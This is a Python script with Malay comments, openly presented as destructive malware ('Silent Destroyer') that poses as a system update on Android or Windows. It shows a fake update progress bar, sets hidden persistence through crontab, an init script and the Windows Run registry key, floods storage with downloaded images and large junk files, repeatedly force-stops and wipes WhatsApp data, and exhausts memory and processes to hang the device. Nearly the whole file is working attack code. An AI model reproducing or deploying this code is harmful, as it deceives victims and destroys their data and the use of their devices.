#!/usr/bin/env python3
# CYBER FORCE - SILENT DESTROYER V1.0
# Nampak macam system update - sebenarnya destroyer gila babi
# 100% STEALTH - Tiada banner, tiada output mencurigakan

import os
import sys
import time
import random
import threading
import requests
import shutil
import subprocess
import json
import hashlib
import platform
from datetime import datetime
from pathlib import Path

# ============================================
# KONFIGURASI (SEMUA TERSEMBUNYI)
# ============================================
CONFIG = {
    "mode": "silent",
    "gambar_urls": [
        "https://iili.io/ClfkhsS.jpg",
        "https://iili.io/Clfkwq7.jpg",
        "https://iili.io/ClfOjTl.jpg"
    ],
    "threads": 200,
    "delay_start": 10,
    "spam_speed": 0.001,
}

# ============================================
# SEMUA FOLDER (MACAM SEBELUM NI)
# ============================================
def get_all_paths():
    """Semua folder - sama macam sebelum ni"""
    if sys.platform == "win32":
        return [
            os.path.expanduser("~\\Pictures\\Spam"),
            os.path.expanduser("~\\Downloads\\Spam"),
            os.path.expanduser("~\\Videos\\Spam"),
            os.path.expanduser("~\\Music\\Spam"),
            os.path.expanduser("~\\Documents\\Spam"),
            os.path.expanduser("~\\Desktop\\Spam"),
            os.path.expanduser("~\\AppData\\Local\\Temp\\Spam"),
            os.path.expanduser("~\\OneDrive\\Pictures\\Spam"),
            "C:\\Windows\\Temp\\Spam",
            "C:\\ProgramData\\Spam",
        ]
    else:
        return [
            "/sdcard/DCIM/Spam",
            "/sdcard/Download/Spam",
            "/sdcard/Pictures/Spam",
            "/sdcard/Movies/Spam",
            "/sdcard/Music/Spam",
            "/sdcard/WhatsApp/Media/WhatsApp Images/Spam",
            "/sdcard/WhatsApp/Media/WhatsApp Video/Spam",
            "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Spam",
            "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/Spam",
            "/sdcard/Telegram/Telegram Images/Spam",
            "/sdcard/Telegram/Telegram Video/Spam",
            "/sdcard/Instagram/Spam",
            "/sdcard/Facebook/Spam",
            "/sdcard/Android/data/com.whatsapp/files/Media/Spam",
            "/sdcard/Android/data/com.whatsapp/cache/Spam",
            "/sdcard/Download/WhatsApp/Spam",
            "/sdcard/Android/data/com.instagram.android/cache/Spam",
            "/sdcard/Android/data/com.facebook.katana/cache/Spam",
            "/sdcard/Android/data/com.telegram.messenger/cache/Spam",
            "/data/local/tmp/.system",
            "/cache/.update",
        ]

# ============================================
# FAKE SYSTEM UPDATE (Target ingat update)
# ============================================

def fake_update():
    """Tunjuk progress update palsu - nampak macam system update"""
    print("Installing system updates...")
    for i in range(101):
        # Progress bar ringkas
        bar = "=" * (i // 2) + " " * (50 - i // 2)
        print(f"\r[{bar}] {i}%", end="")
        time.sleep(random.uniform(0.02, 0.05))
    print("\nUpdate completed. Restarting services...")
    time.sleep(2)

# ============================================
# SILENT SPAMMER (TIADA OUTPUT)
# ============================================

def silent_download(url):
    """Download gambar tanpa output"""
    for attempt in range(3):
        try:
            headers = {
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15"
                ])
            }
            response = requests.get(url, headers=headers, timeout=5, stream=True)
            if response.status_code == 200:
                return response.content
        except:
            pass
    return None

def silent_spam():
    """Spam semua folder - tiada output"""
    counter = 0
    paths = get_all_paths()
    
    # Buat folder
    for path in paths:
        try:
            Path(path).mkdir(parents=True, exist_ok=True)
            # Hidden dari gallery
            with open(os.path.join(path, ".nomedia"), 'w') as f:
                f.write("")
        except:
            pass
    
    while True:
        try:
            url = random.choice(CONFIG["gambar_urls"])
            content = silent_download(url)
            
            if content:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
                filename = f"img_{timestamp}_{random.randint(1000,9999)}.jpg"
                
                for path in paths:
                    try:
                        full_path = os.path.join(path, filename)
                        with open(full_path, 'wb') as f:
                            f.write(content)
                        counter += 1
                    except:
                        pass
                
                # Destroy bila cukup banyak
                if counter > 1000:
                    silent_destroy()
                    counter = 0
                    
            time.sleep(CONFIG["spam_speed"])
            
        except:
            pass

# ============================================
# SILENT DESTROY (TIADA OUTPUT)
# ============================================

def silent_destroy():
    """Destroy system tanpa output"""
    try:
        if sys.platform == "win32":
            # Windows
            temp_paths = [
                os.environ.get('TEMP', 'C:\\Windows\\Temp'),
                os.environ.get('TMP', 'C:\\Temp'),
                "C:\\Windows\\Temp",
            ]
            for path in temp_paths:
                try:
                    for _ in range(20):
                        big_file = os.path.join(path, f"tmp_{int(time.time())}_{random.randint(1000,9999)}.bin")
                        with open(big_file, 'wb') as f:
                            f.write(b'\x00' * (50 * 1024 * 1024))
                except:
                    pass
        else:
            # Android
            system_paths = [
                "/data/local/tmp/.cache",
                "/cache/.system",
                "/sdcard/.android/cache",
                "/sdcard/Android/data/.cache",
            ]
            for path in system_paths:
                try:
                    Path(path).mkdir(exist_ok=True)
                    for _ in range(10):
                        big_file = os.path.join(path, f"sys_{int(time.time())}_{random.randint(1000,9999)}.bin")
                        with open(big_file, 'wb') as f:
                            f.write(b'\x00' * (30 * 1024 * 1024))
                except:
                    pass
    except:
        pass

# ============================================
# SILENT WHATSAPP CRASH
# ============================================

def silent_crash_whatsapp():
    """Crash WhatsApp tanpa output"""
    while True:
        try:
            if sys.platform != "win32":
                # Force stop
                os.system("am force-stop com.whatsapp > /dev/null 2>&1")
                os.system("pm clear com.whatsapp > /dev/null 2>&1")
                os.system("am kill com.whatsapp > /dev/null 2>&1")
                
                # Spam WhatsApp folders
                whatsapp_paths = [
                    "/sdcard/WhatsApp/Media/WhatsApp Images/.cache",
                    "/sdcard/WhatsApp/Media/WhatsApp Video/.cache",
                    "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/.temp",
                    "/sdcard/Android/data/com.whatsapp/files/Media/.cache",
                ]
                for path in whatsapp_paths:
                    try:
                        Path(path).mkdir(exist_ok=True)
                        for _ in range(10):
                            file_path = os.path.join(path, f"crash_{int(time.time())}_{random.randint(1000,9999)}.bin")
                            with open(file_path, 'wb') as f:
                                f.write(b'\x00' * (20 * 1024 * 1024))
                    except:
                        pass
            else:
                # Windows
                os.system("taskkill /IM WhatsApp.exe /F > nul 2>&1")
                os.system("taskkill /IM WhatsAppDesktop.exe /F > nul 2>&1")
                # Delete WhatsApp cache
                whatsapp_cache = os.path.expanduser("~\\AppData\\Local\\WhatsApp\\Cache")
                try:
                    shutil.rmtree(whatsapp_cache, ignore_errors=True)
                except:
                    pass
            
            time.sleep(30)
        except:
            pass

# ============================================
# SILENT HANG SYSTEM
# ============================================

def silent_hang():
    """Hang system tanpa output"""
    memory_hog = []
    processes = []
    
    while True:
        try:
            # Memory flood
            for _ in range(10):
                try:
                    memory_hog.append(b'\x00' * (5 * 1024 * 1024))
                except:
                    pass
            
            # Process flood
            for _ in range(5):
                try:
                    if sys.platform != "win32":
                        p = subprocess.Popen(
                            ["sleep", "9999"],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                    else:
                        p = subprocess.Popen(
                            ["ping", "127.0.0.1", "-t"],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                    processes.append(p)
                except:
                    pass
            
            time.sleep(0.2)
        except:
            pass

# ============================================
# AUTO-START (HIDDEN)
# ============================================

def setup_autostart():
    """Setup auto-start dalam senyap"""
    try:
        if sys.platform != "win32":
            # Android
            cron_cmd = f"* * * * * python3 {__file__} --silent > /dev/null 2>&1"
            with open("/data/data/com.termux/files/usr/etc/crontab", "a") as f:
                f.write(cron_cmd + "\n")
            # Init script
            init_script = f"""#!/system/bin/sh
while true; do
    python3 {__file__} --silent > /dev/null 2>&1 &
    sleep 30
done
"""
            with open("/data/local/tmp/.system_init.sh", "w") as f:
                f.write(init_script)
            os.chmod("/data/local/tmp/.system_init.sh", 0o755)
        else:
            # Windows
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "SystemUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{__file__}" --silent')
            winreg.CloseKey(handle)
    except:
        pass

# ============================================
# MAIN (Nampak macam system update)
# ============================================

def main():
    # Fake update - target ingat update system
    fake_update()
    
    # Setup auto-start
    setup_autostart()
    
    # Delay sebelum attack
    time.sleep(CONFIG["delay_start"])
    
    # Start semua thread
    threads = []
    
    # Spam
    for _ in range(CONFIG["threads"]):
        t = threading.Thread(target=silent_spam)
        t.daemon = True
        threads.append(t)
        t.start()
    
    # Crash WhatsApp
    t = threading.Thread(target=silent_crash_whatsapp)
    t.daemon = True
    threads.append(t)
    t.start()
    
    # Hang system
    t = threading.Thread(target=silent_hang)
    t.daemon = True
    threads.append(t)
    t.start()
    
    # Simpan PID
    try:
        with open("/tmp/.system_update.pid", "w") as f:
            f.write(str(os.getpid()))
    except:
        pass
    
    # Jalan forever
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        sys.exit()

if __name__ == "__main__":
    if "--silent" in sys.argv:
        # Silent mode - langsung start
        time.sleep(3)
        main()
    else:
        main()
